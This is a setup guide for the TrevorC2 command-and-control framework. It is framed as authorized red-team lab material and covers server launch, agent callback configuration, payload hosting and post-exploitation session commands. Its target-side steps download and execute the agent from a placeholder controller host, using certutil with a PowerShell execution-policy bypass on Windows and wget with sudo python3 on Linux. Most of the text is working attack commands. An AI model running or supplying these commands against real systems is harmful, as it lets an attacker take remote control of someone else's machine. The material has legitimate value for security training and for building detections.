# TrevorC2 – Authorized Lab Usage Guide
> ⚠️ **Important Notice**
>
> This project is intended **strictly for authorized security research, red‑team labs, malware analysis, and defensive testing.**
>
> **Do NOT use this software against systems you do not own or have explicit written permission to test.**
>
> The author assumes no responsibility for misuse.

---

## 📌 Overview
This repository documents the **high‑level setup and interaction flow** for the TrevorC2 framework in a **controlled lab environment**.

It is designed to help security professionals understand:

- Command‑and‑Control (C2) architecture

- Agent callback behavior

- Detection and monitoring opportunities

- Blue‑team validation scenarios

---

## 🖥️ C2 Server Setup (Attacker / Lab Controller)

### 1️⃣ Clone the Repository
Initialize the environment by cloning the framework and entering the project directory.

```bash
git clone https://github.com/trustedsec/trevorc2.git
cd trevorc2

### 2️⃣ Install Dependencies
Ensure python3 and pip3 are installed, then pull the required libraries.

```bash
pip3 install -r requirements.txt

### 3️⃣ Initialize Listener
Start the C2 server to begin monitoring for incoming agent check-ins.

```bash
sudo python3 trevorc2_server.py

## ⚙️ Agent Configuration & Staging

### 1️⃣ Configure Callback Parameters
Modify the agent script to point to your Lab Controller's IP address.

```bash
cd agents

# Edit the $SITE_URL variable in the relevant agent file:

```bash
vim trevorc2_client.py 

### 2️⃣ Host the Payload
Start a temporary listener to deliver the agent to the target system.

# Run from within the /agents directory
```bash
python3 -m http.server 8000

## 🎯 Target System Execution
# Option A: Windows Environment (PowerShell)

```bash
cd Desktop
certutil -urlcache -f http://<CONTROLLER_IP>:8000/trevorc2_client.ps1 client.ps1
powershell -ep bypass -file .\client.ps1

# Option B: Linux Environment (Bash)

```bash
cd ~/Desktop
wget http://<CONTROLLER_IP>:8000/trevorc2.py
sudo python3 trevorc2.py

## 🎮 Post-Exploitation Interaction
Once the connection is established, manage the session through the server console.

List all active agents:

```bash
list

Interact with a session:

```bash
interact <ID>
